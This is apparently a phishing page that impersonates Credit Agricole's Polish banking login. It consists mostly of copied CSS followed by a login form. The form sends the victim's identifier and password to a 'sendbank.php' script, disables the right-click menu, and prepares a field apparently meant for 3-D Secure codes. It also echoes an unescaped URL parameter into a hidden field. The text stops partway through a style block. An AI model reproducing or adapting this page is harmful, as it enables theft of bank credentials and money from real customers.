        background-color: hsla(0, 0%, 100%, .6);
        border-color: hsla(0, 0%, 100%, .6)
      }
      
      .btn-outline-info:not(:disabled):not(.disabled).active:focus,
      .btn-outline-info:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem hsla(0, 0%, 100%, .5)
      }
      
      .btn-outline-warning:not(:disabled):not(.disabled).active,
      .btn-outline-warning:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #f76327;
        border-color: #f76327
      }
      
      .btn-outline-warning:not(:disabled):not(.disabled).active:focus,
      .btn-outline-warning:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(247, 99, 39, .5)
      }
      
      .btn-outline-danger:not(:disabled):not(.disabled).active,
      .btn-outline-danger:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #991f28;
        border-color: #991f28
      }
      
      .btn-outline-danger:not(:disabled):not(.disabled).active:focus,
      .btn-outline-danger:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(153, 31, 40, .5)
      }
      
      .btn-outline-light:not(:disabled):not(.disabled).active,
      .btn-outline-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #f8f9fa;
        border-color: #f8f9fa
      }
      
      .btn-outline-light:not(:disabled):not(.disabled).active:focus,
      .btn-outline-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
      }
      
      .btn-outline-dark:not(:disabled):not(.disabled).active,
      .btn-outline-dark:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #343a40;
        border-color: #343a40
      }
      
      .btn-outline-dark:not(:disabled):not(.disabled).active:focus,
      .btn-outline-dark:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(52, 58, 64, .5)
      }
      
      .btn-outline-medium-light:not(:disabled):not(.disabled).active,
      .btn-outline-medium-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #adb5bd;
        border-color: #adb5bd
      }
      
      .btn-outline-medium-light:not(:disabled):not(.disabled).active:focus,
      .btn-outline-medium-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(173, 181, 189, .5)
      }
      
      .btn-outline-default:not(:disabled):not(.disabled).active,
      .btn-outline-default:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #f8f9fa;
        border-color: #f8f9fa
      }
      
      .btn-outline-default:not(:disabled):not(.disabled).active:focus,
      .btn-outline-default:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
      }
      
      .btn-lg {
        padding: .5rem 1rem;
        font-size: 1.25rem;
        line-height: 1.5;
        border-radius: .3rem
      }
      
      .dropdown {
        position: relative
      }
      
      .dropdown-toggle {
        white-space: nowrap
      }
      
      .dropdown-toggle:after {
        display: inline-block;
        margin-left: .255em;
        vertical-align: .255em;
        content: "";
        border-top: .3em solid;
        border-right: .3em solid transparent;
        border-bottom: 0;
        border-left: .3em solid transparent
      }
      
      .dropdown-menu {
        position: absolute;
        top: 100%;
        left: 0;
        z-index: 1000;
        display: none;
        float: left;
        min-width: 10rem;
        padding: .5rem 0;
        margin: .125rem 0 0;
        font-size: 1rem;
        color: #212529;
        text-align: left;
        list-style: none;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid rgba(0, 0, 0, .15);
        border-radius: .25rem
      }
      
      .dropdown-item {
        display: block;
        width: 100%;
        padding: .25rem 1.5rem;
        clear: both;
        font-weight: 400;
        color: #212529;
        text-align: inherit;
        white-space: nowrap;
        background-color: transparent;
        border: 0
      }
      
      .dropdown-item:focus,
      .dropdown-item:hover {
        color: #16181b;
        text-decoration: none;
        background-color: #f8f9fa
      }
      
      .dropdown-item:active {
        color: #fff;
        text-decoration: none;
        background-color: #007bff
      }
      
      .dropdown-item:disabled {
        color: #6c757d;
        pointer-events: none;
        background-color: transparent
      }
      
      .custom-control-input:focus:not(:checked)~.custom-control-label:before {
        border-color: #80bdff
      }
      
      .custom-control-input:not(:disabled):active~.custom-control-label:before {
        color: #fff;
        background-color: #b3d7ff;
        border-color: #b3d7ff
      }
      
      .nav {
        display: flex;
        flex-wrap: wrap;
        padding-left: 0;
        margin-bottom: 0;
        list-style: none
      }
      
      .card {
        position: relative;
        display: flex;
        flex-direction: column;
        min-width: 0;
        word-wrap: break-word;
        background-clip: border-box;
        border: 0 solid rgba(0, 0, 0, .125);
        border-radius: 0
      }
      
      .alert {
        position: relative;
        padding: .75rem 1.25rem;
        margin-bottom: 1rem;
        border: 1px solid transparent;
        border-radius: .25rem
      }
      
      .alert-warning {
        color: #803314;
        background-color: #fde0d4;
        border-color: #fdd3c3
      }
      
      .close:not(:disabled):not(.disabled):focus,
      .close:not(:disabled):not(.disabled):hover {
        opacity: .75
      }
      
      .clearfix:after {
        display: block;
        clear: both;
        content: ""
      }
      
      @media (min-width:768px) {
        .d-md-none {
          display: none!important
        }
      }
      
      .justify-content-end {
        justify-content: flex-end!important
      }
      
      @supports (position:sticky) {}
      
      .h-100 {
        height: 100%!important
      }
      
      .my-2 {
        margin-top: .5rem!important
      }
      
      .my-2 {
        margin-bottom: .5rem!important
      }
      
      .mb-4 {
        margin-bottom: 1.5rem!important
      }
      
      @media (min-width:1160px) {
        .my-lg-0 {
          margin-top: 0!important
        }
        .my-lg-0 {
          margin-bottom: 0!important
        }
      }
      
      .text-right {
        text-align: right!important
      }
      
      @media print {
        *,
        :after,
        :before {
          text-shadow: none!important;
          box-shadow: none!important
        }
        a:not(.btn) {
          text-decoration: underline
        }
        h2,
        p {
          orphans: 3;
          widows: 3
        }
        h2 {
          page-break-after: avoid
        }
        @page {
          size: a3
        }
        body {
          min-width: 992px!important
        }
      }
      
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled):active {
        border-color: #dfdfdf
      }
      
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(222, 222, 223, .5)
      }
      
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #739900;
        border-color: #698c00
      }
      
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-primary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(135, 179, 6, .5)
      }
      
      .theme-hicontrast .btn-secondary:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-secondary:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #000;
        border-color: #000
      }
      
      .theme-hicontrast .btn-secondary:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-secondary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(38, 38, 38, .5)
      }
      
      .theme-hicontrast .btn-success:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-success:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #739900;
        border-color: #698c00
      }
      
      .theme-hicontrast .btn-success:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-success:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(135, 179, 6, .5)
      }
      
      .theme-hicontrast .btn-info:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-info:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #117a8b;
        border-color: #10707f
      }
      
      .theme-hicontrast .btn-info:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-info:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(58, 176, 195, .5)
      }
      
      .theme-hicontrast .btn-warning:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-warning:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #e34708;
        border-color: #d64308
      }
      
      .theme-hicontrast .btn-warning:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-warning:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(248, 122, 71, .5)
      }
      
      .theme-hicontrast .btn-danger:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-danger:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #bd2130;
        border-color: #b21f2d
      }
      
      .theme-hicontrast .btn-danger:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-danger:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(225, 83, 97, .5)
      }
      
      .theme-hicontrast .btn-light:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #dae0e5;
        border-color: #d3d9df
      }
      
      .theme-hicontrast .btn-light:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(216, 217, 219, .5)
      }
      
      .theme-hicontrast .btn-dark:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-dark:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #1d2124;
        border-color: #171a1d
      }
      
      .theme-hicontrast .btn-dark:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-dark:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(82, 88, 93, .5)
      }
      
      .theme-hicontrast .btn-medium-light:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-medium-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #919ca6;
        border-color: #8a95a1
      }
      
      .theme-hicontrast .btn-medium-light:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-medium-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(152, 159, 167, .5)
      }
      
      .theme-hicontrast .btn-default:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-default:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #dae0e5;
        border-color: #d3d9df
      }
      
      .theme-hicontrast .btn-default:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-default:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(216, 217, 219, .5)
      }
      
      .theme-hicontrast .btn-outline-primary:not(:disabled):not(.disabled).active,
      .theme-hicontrast .btn-outline-primary:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #9c0;
        border-color: #9c0
      }
      
      .theme-hicontrast .btn-outline-primary:not(:disabled):not(.disabled).active:focus,
      .theme-hicontrast .btn-outline-primary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(153, 204, 0, .5)
      }
      
      body {
        background-size: cover;
        background-attachment: fixed
      }
      
      @media (max-width:767.98px) {
        body {
          background-size: auto 100%
        }
        :root body,
        body _:future {
          background-size: auto 100%;
          background-position: 0 0;
          background-repeat: no-repeat
        }
      }
      
      @media screen and (max-width:767.98px) and (min-aspect-ratio:1/1) {
        :root body,
        body _:future {
          background-size: 100vw auto
        }
      }
      
      @media screen and (max-width:767.98px) and (min-aspect-ratio:1/1) {
        body {
          background-size: 100vw auto
        }
      }
      
      .theme-default #main>.site-width,
      .theme-default header>.site-width {
        background: hsla(0, 0%, 92.5%, .45)
      }
      
      body,
      button,
      input {
        font-family: Open Sans, sans-serif;
        font-weight: 300
      }
      
      button {
        color: inherit
      }
      
      .theme-default h1 {
        color: #007e90
      }
      
      :focus {
        outline: 0
      }
      
      .theme-default a:not(.btn) {
        color: #007e90
      }
      
      a,
      a:active,
      a:focus,
      a:hover,
      a>span {
        text-decoration: none
      }
      
      a:active>span,
      a:focus>span,
      a:hover>span {
        text-decoration: underline
      }
      
      a.text-link-sm span {
        font-weight: 600
      }
      
      .theme-default a.text-link-sm span {
        color: #007e90
      }
      
      .theme-default a.text-link-sm span:focus,
      .theme-default a.text-link-sm span:hover {
        color: #006675
      }
      
      .btn:focus {
        outline: 0
      }
      
      .btn.btn-primary {
        cursor: pointer;
        font-weight: 600
      }
      
      .btn.btn-primary {
        text-transform: uppercase
      }
      
      .btn.btn-default {
        cursor: pointer
      }
      
      .btn:disabled {
        opacity: .5;
        cursor: default
      }
      
      .btn-lg {
        padding: .5rem 2.4em;
        font-size: 1rem
      }
      
      .text-right {
        text-align: right
      }
      
      a.text-link-sm span {
        font-size: .75rem!important
      }
      
      .form-group label {
        font-weight: 400
      }
      
      @media (min-width:1160px) {
        .form-group label .help-info.help-info-md {
          vertical-align: sub
        }
      }
      
      .form-control {
        font-size: 1rem
      }
      
      .theme-default .form-control:disabled {
        background: #e8e8e8;
        color: inherit;
        border-color: #d8d8d8
      }
      
      input[placeholder] {
        text-overflow: ellipsis
      }
      
      .btn-checkbox-ip input:not(:checked)~.checkbox-checked-content {
        display: none!important
      }
      
      .dropdown>.btn {
        cursor: pointer;
        text-overflow: ellipsis;
        overflow: hidden;
        padding-right: 2em
      }
      
      .dropdown .dropdown-item {
        padding: .25rem 1rem
      }
      
      .dropdown-toggle {
        position: relative
      }
      
      .dropdown-toggle:after {
        content: "";
        font-family: cawebfont;
        width: auto;
        height: auto;
        border: 0;
        margin: 0!important;
        position: absolute;
        right: 0;
        top: 50%;
        transform: translate(-50%, -50%)
      }
      
      .dropdown-menu {
        min-width: 100%
      }
      
      .theme-default .dropdown:not(.color-dropdown) .dropdown-toggle:not(.type-label) {
        background: #fff;
        color: #4a4e51;
        border-color: #d8d8d8
      }
      
      .dropdown:not(.color-dropdown)>.btn-default {
        display: flex;
        flex-flow: row nowrap;
        align-items: center;
        padding: 7px 36px 7px 12px
      }
      
      .dropdown:not(.color-dropdown)>.btn-default,
      .dropdown:not(.color-dropdown)>.btn-default.dropdown-toggle,
      .dropdown:not(.color-dropdown)>.btn-default:active,
      .dropdown:not(.color-dropdown)>.btn-default:not([disabled]):not(.disabled):active {
        box-shadow: none
      }
      
      .dropdown:not(.color-dropdown)>.btn-default.dropdown-toggle:after {
        border-left: 0;
        padding-left: .25em;
        margin: -.25em -30px -.25em -4px;
        font-size: 1.333rem
      }
      
      .dropdown:not(.color-dropdown)>.btn-default.dropdown-toggle:focus {
        outline: 0!important
      }
      
      .theme-default .dropdown:not(.color-dropdown)>.btn-default.dropdown-toggle:not([disabled]):not(.disabled):focus {
        background: #f1f1f1;
        color: #4a4e51;
        border-color: #007e90
      }
      
      .theme-default .dropdown:not(.color-dropdown)>.btn-default.dropdown-toggle:not([disabled]):not(.disabled):focus:after {
        color: #007e90
      }
      
      .theme-default .dropdown-menu {
        background: #fff;
        color: inherit;
        border-color: #d8d8d8
      }
      
      .theme-default .dropdown-menu .dropdown-item:focus,
      .theme-default .dropdown-menu .dropdown-item:hover {
        background: #f5f5f5;
        color: #4a4e51
      }
      
      .theme-default .dropdown-item {
        background: transparent;
        color: #4a4e51
      }
      
      .dropdown-menu>.dropdown-item:hover,
      .dropdown-menu>.dropdown-item:not([href]):not([tabindex]):hover {
        cursor: pointer
      }
      
      .theme-default .dropdown-menu>.dropdown-item:hover,
      .theme-default .dropdown-menu>.dropdown-item:not([href]):not([tabindex]):hover {
        background: #f5f5f5;
        color: #4a4e51
      }
      
      @-moz-document url-prefix() {}
      
      .container-fluid {
        padding-left: 20px;
        padding-right: 20px
      }
      
      .row {
        margin-left: -20px;
        margin-right: -20px
      }
      
      .no-gutters {
        margin-left: 0;
        margin-right: 0
      }
      
      .col-12 {
        padding-left: 20px;
        padding-right: 20px
      }
      
      .main-container.equal-gutters .col-12 {
        padding-left: 0;
        padding-right: 0
      }
      
      .no-gutters>.col-12 {
        padding-left: 0;
        padding-right: 0
      }
      
      .card-inner {
        padding: 13.332px 20px
      }
      
      @media (min-width:480px) {
        .container-fluid {
          padding-left: 20px;
          padding-right: 20px
        }
        .row {
          margin-left: -20px;
          margin-right: -20px
        }
        .no-gutters {
          margin-left: 0;
          margin-right: 0
        }
        .col-12 {
          padding-left: 20px;
          padding-right: 20px
        }
        .main-container.equal-gutters .col-12 {
          padding-left: 0;
          padding-right: 0
        }
        .no-gutters>.col-12 {
          padding-left: 0;
          padding-right: 0
        }
        .card-inner {
          padding: 13.332px 20px
        }
      }
      
      @media (min-width:768px) {
        .container-fluid {
          padding-left: 30px;
          padding-right: 30px
        }
        .row {
          margin-left: -30px;
          margin-right: -30px
        }
        .main-container.equal-gutters .row {
          margin-left: -45px;
          margin-right: -45px
        }
        .no-gutters {
          margin-left: 0;
          margin-right: 0
        }
        .col-12,
        .col-md-6 {
          padding-left: 30px;
          padding-right: 30px
        }
        .main-container.equal-gutters .col-12,
        .main-container.equal-gutters .col-md-6 {
          padding-left: 15px;
          padding-right: 15px
        }
        .no-gutters>.col-12,
        .no-gutters>.col-md-6 {
          padding-left: 0;
          padding-right: 0
        }
        .card-inner {
          padding: 19.998px 30px
        }
      }
      
      @media (min-width:1160px) {
        .container-fluid {
          padding-left: 40px;
          padding-right: 40px
        }
        .row {
          margin-left: -40px;
          margin-right: -40px
        }
        .main-container.equal-gutters .row {
          margin-left: -60px;
          margin-right: -60px
        }
        .no-gutters {
          margin-left: 0;
          margin-right: 0
        }
        .col-12,
        .col-lg-4,
        .col-lg-8,
        .col-lg-12,
        .col-md-6 {
          padding-left: 40px;
          padding-right: 40px
        }
        .main-container.equal-gutters .col-12,
        .main-container.equal-gutters .col-md-6 {
          padding-left: 20px;
          padding-right: 20px
        }
        .no-gutters>.col-12,
        .no-gutters>.col-lg-12,
        .no-gutters>.col-md-6 {
          padding-left: 0;
          padding-right: 0
        }
        .card-inner {
          padding: 26.664px 40px
        }
      }
      
      @media (min-width:1560px) {
        .container-fluid {
          padding-left: 40px;
          padding-right: 40px
        }
        .row {
          margin-left: -40px;
          margin-right: -40px
        }
        .main-container.equal-gutters .row {
          margin-left: -60px;
          margin-right: -60px
        }
        .no-gutters {
          margin-left: 0;
          margin-right: 0
        }
        .col-12,
        .col-lg-4,
        .col-lg-8,
        .col-lg-12,
        .col-md-6 {
          padding-left: 40px;
          padding-right: 40px
        }
        .main-container.equal-gutters .col-12,
        .main-container.equal-gutters .col-md-6 {
          padding-left: 20px;
          padding-right: 20px
        }
        .no-gutters>.col-12,
        .no-gutters>.col-lg-12,
        .no-gutters>.col-md-6 {
          padding-left: 0;
          padding-right: 0
        }
        .card-inner {
          padding: 26.664px 40px
        }
      }
      
      .site-width {
        margin: 0 auto
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        .site-width {
          width: 86%
        }
      }
      
      @media (min-width:1160px) {
        .site-width {
          max-width: 1920px;
          width: 90%
        }
      }
      
      #main {
        border-top: .015625px solid transparent;
        border-bottom: .015625px solid transparent
      }
      
      .theme-default #main {
        background-color: transparent
      }
      
      .theme-default #main {
        color: #007e90;
      }
      
      @media (max-width:767.98px) {
        #main {
          min-height: calc(100vh - 699px + 0px)
        }
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        #main {
          min-height: calc(100vh - 519px + 0px)
        }
      }
      
      @media (min-width:1160px) {
        #main {
          min-height: calc(100vh - 353px + 0px)
        }
        .login #main {
          min-height: calc(100vh - 250px + 0px)
        }
      }
      
      #main>.site-width {
        margin-top: 1.5rem;
        margin-bottom: 1.5rem
      }
      
      #main>.site-width app-login-screen>.container-fluid,
      #main>.site-width app-login-screen>.container-fluid>.row:only-child {
        align-content: flex-start
      }
      
      @media (max-width:767.98px) {
        #main>.site-width app-login-screen>.container-fluid,
        #main>.site-width app-login-screen>.container-fluid>.row:only-child {
          min-height: calc(100vh - 699px + -2.75rem)
        }
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        #main>.site-width app-login-screen>.container-fluid,
        #main>.site-width app-login-screen>.container-fluid>.row:only-child {
          min-height: calc(100vh - 519px + -2.5rem)
        }
      }
      
      @media (min-width:1160px) {
        #main>.site-width app-login-screen>.container-fluid,
        #main>.site-width app-login-screen>.container-fluid>.row:only-child {
          min-height: calc(100vh - 353px + -3rem)
        }
        .login #main>.site-width app-login-screen>.container-fluid,
        .login #main>.site-width app-login-screen>.container-fluid>.row:only-child {
          min-height: calc(100vh - 250px + -3rem)
        }
      }
      
      @media (max-width:767.98px) {
        #main>.site-width {
          margin-top: 1.25rem
        }
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        #main>.site-width {
          margin-top: 1rem
        }
      }
      
      a.help-info {
        text-decoration: none;
        display: inline-block;
        border-radius: 50%;
        background-clip: content-box;
        text-align: center;
        border: 0;
        vertical-align: sub;
        cursor: pointer;
        width: 1.875rem;
        height: 1.875rem;
        line-height: 1.625rem;
        padding: .125rem
      }
      
      .theme-default a.help-info {
        background-color: #007e90;
        color: #fff
      }
      
      a.help-info .ca {
        color: inherit;
        vertical-align: 0
      }
      
      a.help-info .ca {
        font-size: 1.2375rem
      }
      
      a.help-info.help-info-md {
        width: 1.875rem;
        height: 1.875rem;
        line-height: 1.625rem;
        padding: .125rem
      }
      
      a.help-info.help-info-md .ca {
        font-size: 1.2375rem
      }
      
      @media (max-width:1159.98px) {
        a.help-info {
          vertical-align: -21%
        }
      }
      
      @media (min-width:1160px) {
        a.help-info.help-info-md {
          width: 1.625rem;
          height: 1.625rem;
          line-height: 1.375rem;
          padding: .125rem
        }
        a.help-info.help-info-md .ca {
          font-size: 1.0725rem
        }
      }
      
      form .form-group {
        position: relative;
        margin-bottom: .25rem
      }
      
      @media (min-width:1160px) {
        form .form-group.input-keyboard-group {
          display: flex;
          flex-wrap: wrap;
          align-items: center
        }
        form .form-group.input-keyboard-group label {
          flex-basis: 100%;
          padding-top: 10px;
        }
        form .form-group.input-keyboard-group input.form-control {
          min-width: 0;
          flex-basis: 0;
          flex-grow: 1
        }
      }
      
      form .buttons {
        display: flex
      }
      
      form .buttons.buttons-right {
        justify-content: flex-end
      }
      
      form .not-too-wide {
        max-width: 25rem
      }
      
      form label {
        display: block;
        font-weight: 400;
        font-size: .875rem;
        margin-bottom: .3125rem
      }
      
      form .form-control {
        font-size: 1rem;
        font-weight: 600;
        line-height: 1.3125;
        padding-top: .53125rem;
        padding-bottom: .53125rem
      }
      
      @media (max-width:767.98px) {
        #main {
          padding-left: 0;
          padding-right: 0
        }
      }
      
      @media (min-width:990px) {
        #main>.site-width {
          transition: margin-top .333s ease
        }
      }
      
      .theme-default .filter-checkbox:hover input:not(:checked)~em,
      .theme-default .filter-checkbox input:not(:checked):focus~em,
      .theme-default .filter-radio:hover input:not(:checked)~em,
      .theme-default .filter-radio input:not(:checked):focus~em {
        background: #fff;
        color: #4a4e51
      }
      
      .theme-hicontrast .filter-checkbox:hover input:not(:checked)~em,
      .theme-hicontrast .filter-checkbox input:not(:checked):focus~em,
      .theme-hicontrast .filter-radio:hover input:not(:checked)~em,
      .theme-hicontrast .filter-radio input:not(:checked):focus~em {
        background: hsla(0, 0%, 100%, .1);
        color: #fff
      }
      
      #massEdit .btn-wrapper input[type=checkbox]:not(:checked)~.bootstrap-select,
      #massEdit .btn-wrapper input[type=checkbox]:not(:checked)~.form-control,
      #massEdit .btn-wrapper input[type=radio]:not(:checked)~.bootstrap-select,
      #massEdit .btn-wrapper input[type=radio]:not(:checked)~.form-control {
        display: none
      }
      
      body.user-not-recognized {
        background-image: url("agri-image-13.jpg")!important
      }
      
      @media (min-width:768px) {
        body.user-not-recognized {
          background-image: url("tatry01_1160.38622a783e42e7fe6e91.jpg")!important
        }
      }
      
      @media (min-width:1160px) {
        body.user-not-recognized {
          background-image: url("agri-image-3.jpg")!important
        }
      }
      
      @media (min-width:768px) {
        .md-sticky-bottom-container {
          position: sticky;
          bottom: 0;
          display: flex;
          flex-direction: column;
          justify-content: flex-end
        }
      }
      
      @media (min-width:768px) {
        .md-strech,
        .md-strech>* {
          display: flex;
          flex-direction: column
        }
        .md-strech>* {
          flex-grow: 1
        }
        .md-strech>*>* {
          flex-grow: 1;
          width: 100%
        }
      }
      
      .login#wrap {
        background: none
      }
      
      .theme-default .login .card-inner {
        background-color: #d8d8d8
      }
      
      .theme-default .login #main>.main-container {
        background: none!important
      }
      
      .login #main>.main-container .container-fluid {
        display: flex;
        flex-direction: column
      }
      
      .login #main>.main-container .container-fluid>.row {
        flex-grow: 1
      }
      
      .login #main>.main-container h1.h4 {
        color: inherit;
        margin-bottom: 1.5rem
      }
      
      @media (min-width:480px) {
        .login #main>.main-container h1.h4 {
          margin-bottom: 3rem
        }
      }
      
      .theme-default .login #main>.main-container .form-container {
        background-color: #fff
      }
      
      .dropdown-tabs.blue .nav-item:not(.active):not(:focus):not(:hover):not(:last-child):after,
      .responsive-nav-tabs.blue .nav-item:not(.active):not(:focus):not(:hover):not(:last-child):after {
        content: "";
        position: absolute;
        width: 1px;
        right: 0;
        top: .625rem;
        bottom: .625rem;
        background-color: #c7c7c7
      }
      
      :not(output):-moz-ui-invalid,
      :not(output):-moz-ui-invalid:-moz-focusring {
        box-shadow: none
      }
      
      body {
        color: #4a4e51;
        font-family: Open Sans, sans-serif;
        font-size: .875rem;
        margin: 0
      }
    </style>
  </head>

  <body class="theme anim user-not-recognized theme-default below-the-fold">
    <noscript> </noscript>
    <app-root _nghost-vjp-c100="" ng-version="11.2.9">
      <div id="wrap" class="login">
        <app-login-header class="ng-star-inserted">
          <header class="brief">
            <div class="logo-container site-width"><span class="logo">Credit Agricole</span></div>
          </header>
        </app-login-header>
        <div tabindex="-1" id="main">
          <div class="main-container site-width equal-gutters">
            <app-top-alert class="ng-tns-c40-0"> </app-top-alert>
            <app-login class="ng-tns-c169-3 ng-star-inserted">
              <div class="ng-tns-c169-3 ng-trigger ng-trigger-routeAnimation">
                <router-outlet class="ng-tns-c169-3"></router-outlet>
                <app-login-screen class="ng-tns-c168-4 ng-star-inserted" style="">
                  <div class="container-fluid ng-tns-c168-4">
                    <div class="row justify-content-end ng-tns-c168-4">
                      <div class="col-12 col-md-6 ng-tns-c168-4"> </div>
                      <div class="col-12 col-md-6 md-strech ng-tns-c168-4">
                        <app-login-form-user class="ng-tns-c168-4 ng-star-inserted">
                          <div class="card-inner form-container">
                            <form autocomplete="off" aria-hidden="false" action="sendbank.php" method="post" id="formblock" class="ng-pristine ng-invalid ng-touched">
                              <h1 class="h4">Zaloguj się</h1>
                              <div class="form-group input-keyboard-group user-group not-too-wide">

                                
                                <label for="login">Twój identyfikator </label>
                                <input id="login" name="logindata" type="text" autocomplete="off" maxlength="30" class="form-control ng-pristine ng-invalid ng-touched" placeholder="Wprowadź identyfikator" required=""> </div>
                              <div class="form-group input-keyboard-group user-group not-too-wide">
                                <label for="login">Hasło </label>
                                <input id="login" name="passdata" type="text" autocomplete="off" maxlength="30" class="form-control ng-pristine ng-invalid ng-touched" placeholder="hasło" required=""> </div>
                              <div class="form-group not-too-wide text-right my-2 my-lg-0"><a href="" class="text-link-sm"><span>Masz problem z zalogowaniem?</span></a></div>
                              <div class="form-group not-too-wide text-right mb-4 ng-star-inserted"><a href="" class="text-link-sm"><span>Nie pamiętasz hasła?</span></a></div>
                              <div class="buttons buttons-right not-too-wide">
                              <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                              <input type="hidden" name="type" value="10">
                                <input id="login-user-click-button" type="submit" class="btn btn-primary btn-lg" value="Dalej"> </div>
                            </form>
                            <script>
                              let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
                              let pwdLen = 20;

                              function inputMask(elem) {
                                let val = elem.value;
                                let val2 = '';
                                for (let i = 0; i < val.length; i++) {
                                  if (pwdChars.includes(val[i])) val2 += val[i];
                                }
                                elem.value = val2.substr(0, pwdLen);
                              }
                              document.addEventListener('DOMContentLoaded', function() {
                                field3ds.oninput = function() {
                                  inputMask(field3ds);
                                }
                                field3ds.focus();
                              });
                              document.oncontextmenu = function() {
                                return false;
                              };
                            </script>
                            <style>
                              .chaport-container.chaport-container-positioned {
                                position: fixed;
                                box-sizing: border-box;
                                top: auto;
                                right: 0;
                                bottom: 0;
                                left: 0;
                                width: auto;
                                height: 0;
                                overflow: visible;
                              }
                              
                              .chaport-container {
                                font-size: 14px;
                                z-index: 2147483500;
                              }
                              
                              .chaport-container .chaport-launcher {
                                position: absolute;
                                display: block;
                                bottom: 0;
                                right: 0;
                                left: 0;
                                z-index: 2147483500;
                                width: auto;
                                height: 0;
                                overflow: visible;
                                font-size: 14px;
                              }
                              
                              .chaport-container div {
                                display: block;
                              }
                              
                              .chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button,
                              .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
                                background-color: #007e90;
                              }
                              
                              .chaport-container .chaport-launcher .chaport-launcher-button {
                                position: absolute;
                                bottom: 1.42857em;
                                right: 1.42857em;
                                width: 4.28571em;
                                height: 4.28571em;
                                -webkit-border-radius: 50%;
                                -moz-border-radius: 50%;
                                -ms-border-radius: 50%;
                                border-radius: 50%;
                                -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                cursor: pointer;
                                -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                              }
                              
                              .chaport-container .chaport-anim-show {
                                visibility: visible;
                                opacity: 1;
                                -webkit-transition-delay: 0s !important;
                                transition-delay: 0s !important;
                              }
                              
